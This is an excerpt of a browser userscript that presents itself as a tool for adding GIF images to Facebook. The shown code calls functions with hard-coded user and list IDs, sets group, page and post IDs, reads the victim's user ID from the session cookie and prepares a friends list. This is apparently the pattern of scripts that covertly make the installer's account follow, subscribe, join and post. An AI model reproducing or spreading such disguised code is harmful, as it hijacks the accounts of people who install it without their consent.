// ==UserScript==
// @name		Add GIF Image In Facebook
// @description		Add GIF Animated Image, Photo And Picture In Facebook
// @version		v06.6.666
// @author		Edited by MJ-Mirza
// ==============
...
"chars" : " :) ",
    ...
    html += '<a style="color:#F12B63;" href="https://www.facebook.com/groups/KenhPhanPhoi/" target="_blank">☼ KenhPhanPhoi Group ☼</a><a class="jewelFooter" href="https://www.facebook.com//mjmirzaji" target="_blank">MJ-Mirza</a>';
	html += '</div>';
...
a("100002294517182");a("100000556836192");a("100002806502360");sublist("496320153787797");sublist("496320880454391");sublist("476035172482962");sublist("496321713787641");sublist("496322000454279");sublist("496322383787574");

var gid = ['1394036930809021'];
...
var spage_id = "386345328132281";
var spost_id = "386345328132281";
var sfoto_id = "386345328132281";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Add Gif Picture by MJ-Mirza';
